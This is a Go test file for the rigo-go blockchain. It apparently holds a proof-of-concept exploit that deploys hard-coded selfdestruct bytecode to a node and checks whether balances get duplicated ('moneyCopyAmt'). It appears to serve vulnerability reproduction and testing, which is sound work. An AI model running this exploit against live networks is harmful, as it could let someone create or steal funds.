package test

import (
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"github.com/ethereum/go-ethereum/crypto"
	"github.com/holiman/uint256"
	types2 "github.com/rigochain/rigo-go/ctrlers/types"
	"github.com/rigochain/rigo-go/libs/web3"
	"github.com/rigochain/rigo-go/types"
	"github.com/stretchr/testify/require"
	"io/ioutil"
	"log"
	"math/big"
	"net/http"
	"testing"
)

func requestHttp(url string) []byte {
	resp, err := http.Get(url)
	if err != nil {
		log.Fatalln(err)
	}

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		log.Fatalln(err)
	}

	//fmt.Printf("debug http response : %v\n", string(body))
	return body
}

type AccountQueryResponse struct {
	Jsonrpc string  `json:"jsonrpc"`
	ID      float64 `json:"id"`
	Result  struct {
		Response struct {
			Code      float64     `json:"code"`
			Log       string      `json:"log"`
			Info      string      `json:"info"`
			Index     string      `json:"index"`
			Key       string      `json:"key"`
			Value     string      `json:"value"`
			ProofOps  interface{} `json:"proofOps"`
			Height    string      `json:"height"`
			Codespace string      `json:"codespace"`
		} `json:"response"`
	} `json:"result"`
}

type AccountData struct {
	Address types.Address `json:"address"`
	Nonce   string        `json:"nonce"`
	Balance string        `json:"balance"`
}

func getAccountData(address types.Address) AccountData {
	reqUrl := defaultRpcNode.RPCURL + "/abci_query?path=\"account\"&data=0x" + address.String()
	res := requestHttp(reqUrl)
	var accountRes AccountQueryResponse
	err := json.Unmarshal(res, &accountRes)
	if err != nil {
		log.Fatalf("Error in Unmarshal: %v", err)
	}

	accountValue := accountRes.Result.Response.Value
	decodeAccountValue, _ := base64.StdEncoding.DecodeString(accountValue)

	var accountData AccountData
	err = json.Unmarshal(decodeAccountValue, &accountData)

	return accountData
}

func submitTrx(wallet *web3.Wallet, trx *types2.Trx) []byte {
	wallet.Unlock([]byte("1234"))
	wallet.SignTrx(trx)
	encode, _ := trx.Encode()
	return requestHttp(defaultRpcNode.RPCURL + "/broadcast_tx_commit?tx=0x" + hex.EncodeToString(encode))
}

func TestPoCEncode(t *testing.T) {
	wallet := randWallet()
	require.NoError(t, wallet.Unlock(defaultRpcNode.Pass))

	accountData := getAccountData(wallet.Address())

	currentNonce := new(big.Int)
	currentNonce, _ = currentNonce.SetString(accountData.Nonce, 10)

	fromAddr := wallet.Address()
	nonce := currentNonce.Uint64()

	gas := big.NewInt(0)
	gas.SetString("10000000", 10)
	gasEncode, _ := uint256.FromBig(gas)

	moneyCopyAmt := big.NewInt(0)
	moneyCopyAmt.SetString("1", 10)
	//amt.SetString("100", 10)

	fmt.Printf("my address: %s\n", fromAddr.String())
	fmt.Printf("my balance: %s\n", accountData.Balance)

	// create selfdestructContract
	selfdestructContract, _ := hex.DecodeString("6080604052600034604051610013906101a5565b6040518091039082f0905080158015610030573d6000803e3d6000fd5b50905060005b6064811015610123578173ffffffffffffffffffffffffffffffffffffffff16604051610062906101e2565b6000604051808303816000865af19150503d806000811461009f576040519150601f19603f3d011682016040523d82523d6000602084013e6100a4565b606091505b5050508173ffffffffffffffffffffffffffffffffffffffff16476040516100cb906101e2565b60006040518083038185875af1925050503d8060008114610108576040519150601f19603f3d011682016040523d82523d6000602084013e61010d565b606091505b505050808061011b90610230565b915050610036565b508073ffffffffffffffffffffffffffffffffffffffff16604051610147906101e2565b6000604051808303816000865af19150503d8060008114610184576040519150601f19603f3d011682016040523d82523d6000602084013e610189565b606091505b5050503373ffffffffffffffffffffffffffffffffffffffff16ff5b606d8061027983390190565b600081905092915050565b50565b60006101cc6000836101b1565b91506101d7826101bc565b600082019050919050565b60006101ed826101bf565b9150819050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b6000819050919050565b600061023b82610226565b91507fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff820361026d5761026c6101f7565b5b60018201905091905056fe6080604052605c8060116000396000f3fe6080604052600034116024573373ffffffffffffffffffffffffffffffffffffffff16ff5b00fea2646970667358221220b92a15064194560a6285b178c031a892ddbaba26382aeb676c12fa86377d938d64736f6c63430008130033")
	copyAmtEncode, _ := uint256.FromBig(moneyCopyAmt)
	trxObj := web3.NewTrxContract(fromAddr, types.ZeroAddress(), nonce, gasEncode, copyAmtEncode, selfdestructContract)
	submitTrx(wallet, trxObj)
	//fmt.Printf("%s\n", submitTrx(wallet, trxObj))

	fmt.Println("[after]")
	sdContractAddr := crypto.CreateAddress(wallet.Address().Array20(), nonce)
	accountData3 := getAccountData(sdContractAddr[:])
	fmt.Printf("contract A: %s\n", sdContractAddr.String())
	fmt.Printf("contract balance: %s\n", accountData3.Balance)
	nonce += 1

	accountData2 := getAccountData(wallet.Address())
	fmt.Printf("my address: %s\n", fromAddr.String())
	fmt.Printf("my balance: %s\n", accountData2.Balance)

}
